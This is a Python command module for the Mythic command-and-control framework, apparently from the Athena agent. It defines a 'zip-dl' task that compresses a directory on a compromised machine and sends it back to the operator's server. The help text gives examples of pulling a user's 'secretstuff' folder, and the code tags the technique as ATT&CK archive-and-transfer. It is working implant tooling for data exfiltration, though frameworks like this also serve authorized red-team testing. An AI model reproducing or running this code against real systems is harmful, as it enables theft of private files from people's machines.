from ..athena_utils.plugin_utilities import default_completion_callback
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class ZipDlArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="source",
                type=ParameterType.String,
                description="Source directory to zip and download.",
                parameter_group_info=[ParameterGroupInfo(ui_position=0)],
            ),
            CommandParameter(
                name="destination",
                type=ParameterType.String,
                description="Write zip to disk at this path before downloading",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=False,
                    )
                ],
            ),
            CommandParameter(
                name="force",
                type=ParameterType.Boolean,
                description="Force in-memory storage of large zip files",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=2,
                        required=False,
                    )
                ],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            cmds = self.split_commandline()
            if len(cmds) >= 1:
                self.add_arg("source", cmds[0])
            if len(cmds) >= 2:
                self.add_arg("destination", cmds[1])


class ZipDlCommand(CommandBase):
    cmd = "zip-dl"
    needs_admin = False
    script_only = True
    depends_on = "zip"
    help_cmd = """
Download a directory as a zip file in memory that's less than 1GB:
zip-dl C:\\Users\\checkymander\\secretstuff

Download a large directory as a zip file writing to disk first:
zip-dl C:\\Users\\checkymander\\secretstuff\\ C:\\Temp\\stage.zip

Download a directory as a zip file in memory that's larger than 1GB:
zip-dl C:\\Users\\checkymander\\secretstuff\\ -force=true
"""
    description = "Zip a directory and download it to Mythic"
    version = 2
    author = "@checkymander"
    argument_class = ZipDlArguments
    attackmapping = ["T1570", "T1560.001"]
    attributes = CommandAttributes()
    completion_functions = {
        "command_callback": default_completion_callback
    }

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        params = {
            "action": "download",
            "source": taskData.args.get_arg("source"),
        }
        dest = taskData.args.get_arg("destination")
        if dest:
            params["destination"] = dest
        force = taskData.args.get_arg("force")
        if force:
            params["force"] = force
        subtask = MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID,
            CommandName="zip",
            Token=taskData.Task.TokenID,
            SubtaskCallbackFunction="command_callback",
            Params=json.dumps(params),
        )
        await SendMythicRPCTaskCreateSubtask(subtask)
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True)

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        pass
